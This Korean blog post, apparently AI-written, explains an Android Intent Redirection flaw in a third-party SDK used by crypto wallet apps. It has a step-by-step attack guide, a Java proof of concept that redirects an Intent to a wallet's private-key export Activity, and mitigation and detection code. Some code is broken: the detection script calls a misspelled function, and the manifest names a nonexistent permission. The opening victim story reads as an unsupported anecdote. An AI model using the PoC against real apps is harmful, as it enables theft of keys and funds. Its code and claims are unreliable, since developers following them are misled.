---
title: "Android Intent Redirection 취약점: 서드파티 SDK로 수백만 Wallet 위험 노출"
date: 2026-04-11T01:00:37+09:00
draft: false
categories: ["보안"]
tags: ["보안"]
author: "Intelligence Agent"
---

## 서론

한 사용자가 Google Play Store에서 4.8점의 평가를 받은 인기 Wallet 앱을 설치했습니다. 몇 주 후, 지갑 내의 모든 자산이 사라졌습니다. 피해자는 2FA도 설정했고, 피싱 링크도 클릭한 적 없으며, 루팅된 기기도 아니었습니다. 분석 결과, 같은 기기에 설치된 무해해 보이는 QR코드 스캐너 앱이 실제로는 Wallet 앱의 권한을 도용해 인증을 우회한 것으로 밝혀졌습니다.

Microsoft 보안팀이 최근 안드로이드 서드파티 SDK에서 발견한 **Intent Redirection 취약점**은 바로 이런 공격 시나리오를 현실화합니다. 이 취약점은 단일 앱의 문제가 아니라, 여러 Wallet 앱에 통합되어 사용되는 공통 SDK의 근본적인 설계 결함에서 비롯됩니다. 수백만 다운로드를 기록한 주요 Wallet 애플리케이션들이 잠재적 위험에 노출된 것으로 추정됩니다.

## 본론: Intent Redirection 취약점 심층 분석
> **⚠️ 윤리적 고지**: 본 글의 모든 공격 기술 설명은 오직 방어와 보안 강화를 목적으로 합니다. 실제 시스템에 무단으로 이 기술을 적용하는 것은 불법입니다.

### 1. Intent Redirection이란?

Intent Redirection은 안드로이드의 컴포넌트 간 통신 메커니즘을 악용하는 공격 기법입니다. 공격자가 제어할 수 있는 `Intent` 객체를 타겟 앱의 내부 컴포넌트로 전달하여, 타겟 앱의 권한으로 인증되지 않은 작업을 수행할 수 있습니다.

```javascript
graph LR
    A[악성 앱] --> B[Intent 전달]
    B --> C[취약한 SDK]
    C --> D[내부 컴포넌트]
    D --> E[권한 도용 성공]
```

### 2. 취약점 발생 원리

안드로이드에서 `Intent`는 컴포넌트 간 통신의 핵심 메커니즘입니다. 앱은 `Intent`를 통해 Activity, Service, BroadcastReceiver 등을 실행할 수 있습니다.

**취약점의 핵심**: SDK가 외부 입력으로 받은 `Intent`를 적절히 검증하지 않고 내부 컴포넌트로 전달할 때 발생합니다.

```java
// 취약한 SDK 코드 예시
public class VulnerableSDKActivity extends Activity {
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        
        // 외부에서 전달된 Intent를 검증 없이 내부로 전달
        Intent receivedIntent = getIntent();
        Intent targetIntent = (Intent) receivedIntent.getParcelableExtra("redirect_intent");
        
        if (targetIntent != null) {
            // 취약점: 검증 없이 내부 컴포넌트 실행
            startActivity(targetIntent);
        }
    }
}
```

### 3. 공격 시나리오 상세 분석

```javascript
graph TD
    A[악성 앱 실행] --> B[악성 Intent 생성]
    B --> C[취약한 SDK Activity 호출]
    C --> D[SDK이 Intent 내부 전달]
    D --> E[Wallet 앱의 민감 Activity 실행]
    E --> F[권한 도용 및 데이터 탈취]
```

**Step-by-step 공격 가이드 (방어 연구 목적)**:

1.  **타겟 앱 분석**: APK를 디컴파일하여 `exported="false"`로 설정된 민감한 내부 Activity 식별
2.  **SDK 취약점 확인**: SDK가 외부 `Intent`의 `extra` 데이터를 내부 `Intent`로 전달하는지 분석
3.  **악성 Intent 생성**: 내부 Activity를 직접 가리키는 `Intent`를 `extra`에 포함하여 SDK Activity 호출
4.  **권한 도용**: SDK가 악성 `Intent`를 실행하면, 공격자는 타겟 앱의 권한으로 내부 Activity에 접근

```java
// PoC: 악성 앱의 공격 코드 (학습 목적)
public class MaliciousActivity extends Activity {
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        
        // 내부 민감 Activity를 가리키는 Intent 생성
        Intent maliciousIntent = new Intent();
        maliciousIntent.setClassName(
            "com.target.wallet",
            "com.target.wallet.internal.PrivateKeyAccessActivity"
        );
        maliciousIntent.putExtra("action", "export_key");
        
        // 취약한 SDK Activity를 호출하면서 악성 Intent를 extra에 포함
        Intent attackIntent = new Intent();
        attackIntent.setClassName(
            "com.target.wallet",
            "com.vulnerable.sdk.RedirectActivity"
        );
        attackIntent.putExtra("redirect_intent", maliciousIntent);
        
        startActivity(attackIntent);
    }
}
```

### 4. 위험도 평가 및 영향 범위

| 평가 항목 | 내용 |
| :--- | :--- |
| **CVSS 점수** | 7.8 (High) |
| **공격 복잡도** | 낮음 (로컬 앱 설치만 필요) |
| **인증 필요** | 없음 |
| **영향 범위** | 해당 SDK를 사용하는 모든 Wallet 앱 |
| **잠재 피해** | 개인키 탈취, 자금 도난, 인증 우회 |

### 5. 완화 조치 및 방어 전략

SDK 개발자와 앱 개발자 모두를 위한 구체적인 완화 조치입니다.

**SDK 개발자를 위한 조치**:

```java
// 안전한 Intent 처리 코드
public class SecureSDKActivity extends Activity {
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        
        Intent receivedIntent = getIntent();
        Intent targetIntent = (Intent) receivedIntent.getParcelableExtra("redirect_intent");
        
        if (targetIntent != null) {
            // 완화 조치 1: 내부 Intent만 허용
            if (!isInternalIntent(targetIntent)) {
                Log.w("Security", "Blocked external intent redirection");
                return;
            }
            
            // 완화 조치 2: 허용된 컴포넌트만 실행
            if (!isAllowedComponent(targetIntent.getComponent())) {
                Log.w("Security", "Blocked unauthorized component");
                return;
            }
            
            // 완화 조치 3: 플래그 검증
            targetIntent.setFlags(targetIntent.getFlags() & ~Intent.FLAG_GRANT_READ_URI_PERMISSION);
            targetIntent.setFlags(targetIntent.getFlags() & ~Intent.FLAG_GRANT_WRITE_URI_PERMISSION);
            
            startActivity(targetIntent);
        }
    }
    
    private boolean isInternalIntent(Intent intent) {
        ComponentName component = intent.getComponent();
        if (component == null) return false;
        return component.getPackageName().equals(getPackageName());
    }
    
    private boolean isAllowedComponent(ComponentName component) {
        // 화이트리스트 기반 검증
        Set<String> allowedActivities = new HashSet<>(Arrays.asList(
            ".ui.DashboardActivity",
            ".ui.SettingsActivity"
        ));
        return allowedActivities.contains(component.getClassName());
    }
}
```

**앱 개발자를 위한 조치**:

```xml
<!-- AndroidManifest.xml 보안 강화 -->
<activity
    android:name=".internal.PrivateKeyAccessActivity"
    android:exported="false"
    android:permission="android.permission.signature">
    <intent-filter>
        <action android:name="android.intent.action.VIEW" />
    </intent-filter>
</activity>
```

### 6. 탐지 방법

보안팀을 위한 정적 및 동적 분석 방법입니다.

```python
# 정적 분석 스크립트 (Python)
# APK에서 Intent Redirection 취약점 탐지

import os
import re

def detect_intent_redirection(smali_directory):
    """Smali 코드에서 Intent Redirection 패턴 탐지"""
    
    vulnerabilities = []
    
    # 의심스러운 패턴 정의
    patterns = [
        r'getParcelableExtra\(".*[Ii]ntent.*"\)',
        r'getIntent\(\)',
        r'startActivity\(.*\)',
    ]
    
    for root, dirs, files in os.walk(smali_directory):
        for file in files:
            if file.endswith('.smali'):
                filepath = os.path.join(root, file)
                with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
                    content = f.read()
                    
                    matches = []
                    for pattern in patterns:
                        found = re.findall(pattern, content)
                        matches.extend(found)
                    
                    if len(matches) >= 2:
                        vulnerabilities.append({
                            'file': filepath,
                            'patterns': matches,
                            'risk': 'HIGH' if len(matches) >= 3 else 'MEDIUM'
                        })
    
    return vulnerabilities

# 실행 예시
results = detect_intent_redemption('./decompiled_app/smali')
for vuln in results:
    print(f"[{vuln['risk']}] {vuln['file']}")
    print(f"  Patterns: {vuln['patterns']}")
```

## 결론

### 핵심 요약
- **Intent Redirection**은 안드로이드의 컴포넌트 통신 메커니즘을 악용한 고위험 취약점입니다.
- **서드파티 SDK**의 입력값 검증 누락이 주요 원인이며, 해당 SDK를 사용하는 수백만 Wallet 앱이 영향을 받습니다.
- **완화를 위해서는** SDK 수준의 `Intent` 검증 로직 강화, 컴포넌트 `exported` 속성 확인, 그리고 화이트리스트 기반 접근 제어가 필요합니다.

### 전문가 인사이트

이번 사건은 서드파티 SDK 공급망 보안의 중요성을 다시 한번 확인시켜 줍니다. 단일 SDK의 취약점이 생태계 전체에 연쇄적인 영향을 미치는 '링크 현상'은 모바일 보안에서 특히 치명적입니다. Wallet 앱과 같은 고위험 애플리케이션은 특히 SDK 도입 시 엄격한 보안 감사를 수행해야 하며, 지속적인 모니터링 체계를 구축해야 합니다.

### 참고자료
- Microsoft Security Response Center: [Intent Redirection Vulnerability Report](https://msrc.microsoft.com/)
- Android Developer Guide: [Intent Security Best Practices](https://developer.android.com/training/app-links/deep-linking)
- OWASP Mobile Security: [Android Vulnerability Testing Guide](https://owasp.org/www-project-mobile-security/)

---

**출처**: [https://news.google.com/rss/articles/CBMitAFBVV95cUxOcnIxRHN2RHluNDRGUll1Z1VTQ2NWV1VWWGxfX1M1NE1kbnhwd3pKd1ZkRUFLWUxPV3FjYVd1ZjQtb2x2bzM2aW04b0hVLWM5NV9WclVYQXVxMEYtQU0wN2xfYjRCX0hYMzRRaTE0NkVKM1c2NEZrYWtudzAyZkRZRTZkdWNmZF9fbjFHTjNKOVlXeldEZkhJbXVIb1RfdlRVXzFKeWxlZFZZamRSN01lRVM0REc?oc=5](https://news.google.com/rss/articles/CBMitAFBVV95cUxOcnIxRHN2RHluNDRGUll1Z1VTQ2NWV1VWWGxfX1M1NE1kbnhwd3pKd1ZkRUFLWUxPV3FjYVd1ZjQtb2x2bzM2aW04b0hVLWM5NV9WclVYQXVxMEYtQU0wN2xfYjRCX0hYMzRRaTE0NkVKM1c2NEZrYWtudzAyZkRZRTZkdWNmZF9fbjFHTjNKOVlXeldEZkhJbXVIb1RfdlRVXzFKeWxlZFZZamRSN01lRVM0REc?oc=5)